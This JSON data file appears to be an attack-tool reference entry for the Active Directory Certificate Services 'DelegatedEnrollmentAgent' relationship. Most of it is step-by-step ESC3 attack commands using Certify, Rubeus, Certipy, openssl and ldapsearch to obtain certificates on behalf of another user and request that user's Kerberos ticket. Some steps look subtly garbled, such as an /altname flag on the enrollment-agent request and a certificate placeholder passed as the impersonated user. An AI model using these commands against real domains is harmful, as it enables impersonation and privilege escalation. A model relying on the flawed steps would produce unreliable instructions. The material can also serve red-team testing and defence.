{
    "DelegatedEnrollmentAgent": {
        "meaning": "The certificate template is published to an enterprise CA where the enrollment agent restrictions are configured to allow this principal to enroll certificates against this template as an enrollment agent. An attacker may perform an ADCS ESC3 attack that relies on this DelegatedEnrollmentAgent relationship. This relationship alone is not enough to escalate rights or impersonate other principals.",
        "common": "",
        "windows": {
            "ADCS_ESC3_Attack": [
                {
                    "order": 1,
                    "command": "Certify.exe find /vulnerable",
                    "description": "Identify vulnerable certificate templates including enrollment agent templates"
                },
                {
                    "order": 2,
                    "command": "Certify.exe request /ca:ca.domain.com\\CA-NAME /template:EnrollmentAgentTemplate /altname:targetuser@domain.com",
                    "description": "Request enrollment agent certificate with target user's alternative name"
                },
                {
                    "order": 3,
                    "command": "Certify.exe request /ca:ca.domain.com\\CA-NAME /template:TargetTemplate /onbehalfof:ENROLLMENT_AGENT_CERT /enrollcert:enrollment_agent.pfx /enrollcertpw:password",
                    "description": "Use enrollment agent certificate to request certificate on behalf of target user"
                },
                {
                    "order": 4,
                    "command": "Rubeus.exe asktgt /user:targetuser /certificate:target_user.pfx /password:certpassword /domain:domain.com /dc:dc.domain.com /ptt",
                    "description": "Use obtained certificate to request TGT for target user"
                }
            ],
            "Certificate_Enumeration": [
                {
                    "order": 1,
                    "command": "certlm.msc",
                    "description": "Open certificate manager to examine available enrollment agent certificates"
                },
                {
                    "order": 2,
                    "command": "certutil -ca.cert ca_cert.cer",
                    "description": "Download CA certificate for certificate validation"
                },
                {
                    "order": 3,
                    "command": "Get-ChildItem -Path Cert:\\CurrentUser\\My",
                    "description": "Enumerate certificates in current user's personal store"
                }
            ],
            "PowerShell_ADCS": [
                {
                    "order": 1,
                    "command": "Get-CATemplate -CertificationAuthority ca.domain.com",
                    "description": "Enumerate certificate templates available on CA"
                },
                {
                    "order": 2,
                    "command": "Get-Certificate -Template EnrollmentAgentTemplate -CertStoreLocation Cert:\\CurrentUser\\My -SubjectName \"CN=EnrollmentAgent\"",
                    "description": "Request enrollment agent certificate using PowerShell"
                },
                {
                    "order": 3,
                    "command": "# Use enrollment agent certificate for subsequent certificate requests",
                    "description": "Leverage enrollment agent privileges for certificate-based attacks"
                }
            ]
        },
        "linux": {
            "Certipy_ESC3": [
                {
                    "order": 1,
                    "command": "certipy find -u user@domain.com -p password -dc-ip DC_IP -vulnerable",
                    "description": "Identify vulnerable certificate templates including enrollment agent templates"
                },
                {
                    "order": 2,
                    "command": "certipy req -u user@domain.com -p password -ca ca.domain.com\\CA-NAME -template EnrollmentAgentTemplate -dc-ip DC_IP",
                    "description": "Request enrollment agent certificate using Certipy"
                },
                {
                    "order": 3,
                    "command": "certipy req -u user@domain.com -p password -ca ca.domain.com\\CA-NAME -template TargetTemplate -on-behalf-of domain\\targetuser -pfx enrollment_agent.pfx -dc-ip DC_IP",
                    "description": "Use enrollment agent certificate to request certificate on behalf of target user"
                },
                {
                    "order": 4,
                    "command": "certipy auth -pfx target_user.pfx -dc-ip DC_IP",
                    "description": "Authenticate using obtained certificate to get target user's TGT"
                }
            ],
            "Manual_Certificate_Requests": [
                {
                    "order": 1,
                    "command": "openssl req -new -keyout enrollment_agent.key -out enrollment_agent.csr -subj \"/CN=EnrollmentAgent\"",
                    "description": "Generate certificate signing request for enrollment agent certificate"
                },
                {
                    "order": 2,
                    "command": "# Submit CSR to CA using web enrollment or other methods",
                    "description": "Submit certificate request to Certificate Authority"
                },
                {
                    "order": 3,
                    "command": "openssl pkcs12 -export -in enrollment_agent.crt -inkey enrollment_agent.key -out enrollment_agent.pfx",
                    "description": "Convert certificate to PKCS#12 format for use in attacks"
                }
            ],
            "LDAP_CA_Enumeration": [
                {
                    "order": 1,
                    "command": "ldapsearch -x -D 'CN=user,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com -b 'CN=Configuration,DC=domain,DC=com' '(objectClass=pKICertificateTemplate)' name",
                    "description": "Enumerate certificate templates via LDAP"
                },
                {
                    "order": 2,
                    "command": "ldapsearch -x -D 'CN=user,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com -b 'CN=Configuration,DC=domain,DC=com' '(objectClass=pKIEnrollmentService)' dNSHostName",
                    "description": "Enumerate Certificate Authorities via LDAP"
                },
                {
                    "order": 3,
                    "command": "# Analyze certificate template permissions for enrollment agent abuse",
                    "description": "Examine certificate template ACLs for delegation opportunities"
                }
            ]
        }
    }
}
